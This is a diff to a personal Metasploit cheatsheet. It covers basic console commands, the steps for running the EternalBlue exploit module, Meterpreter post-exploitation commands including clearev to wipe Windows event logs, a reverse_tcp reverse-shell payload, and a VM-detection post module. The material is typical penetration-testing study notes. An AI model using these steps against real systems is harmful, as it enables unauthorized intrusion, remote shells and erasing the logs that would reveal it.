@@ -1,13 +1,15 @@
 # Metasploit
 *Personal cheatsheet*<br/> <br/>
 ## Basic commands
-```help```<br/>
+```help``` or ```?```<br/>
 ```search```&emsp;Search modules<br/>
 ```use```&emsp;Select a module<br/>
 ```info```&emsp;Display info about a specific module<br/>
 ```options```&emsp;List options you can set<br/>
 ```advanced```&emsp;Display advanced options for a specific module<br/>
 ```show```&emsp;Show options in a specific category<br/>
+```connect <host> <port> -z``` to try to connect to a remote host, then return. To test its reachability<br/>
+```spool <filepath>``` to save both commands and screen output of metasploit
 ## First steps w/ Metasploit
 ### ```Eternalblue```
 ```search eternalblue```<br/>
@@ -15,6 +17,9 @@
 ```show options```<br/>
 ```set``` to set a value to a module options<br/>
 &nbsp;&nbsp;&nbsp;&nbsp;*ex:* ```set SMBPass username```<br/>
+```setg``` to set a global value<br/>
+```unset``` to change the value of a var. to "null"
+```get``` to view tha value of single variables<br/>
 ```show payloads``` to list compatible payloads<br/>
 ```set PAYLOAD <index>``` to select the desired payload, ```index``` *being the id of the playload from* ```show payloads```<br/>
 ```exploit``` to run the exploit once you've configured all the desired options<br/>
@@ -33,4 +38,11 @@ Once you've run an exploit, ideally it'll give you either a regular command shel
 ```search``` to find files on the remote host.<br/>
 ```cat``` to display the content of a file.<br/>
 ```background``` will put your meterpreter shell in background, *to return to the meterpreter shell* ```session -i <session_id>```<br/>
-```clearev``` will clear the **Application, System, and Security logs** on a **Windows system**.
+```clearev``` will clear the **Application, System, and Security logs** on a **Windows system**.<br/>
+```getuid``` will return the user we're currently connected as
+
+<br/>
+<br/>
+## Usefulls modules / payloads
+```set PAYLOAD windows/meterpreter/reverse_tcp``` very common reverse shell
+```run post/windows/gather/checkvm``` to check if the remote host is running on a VM or not
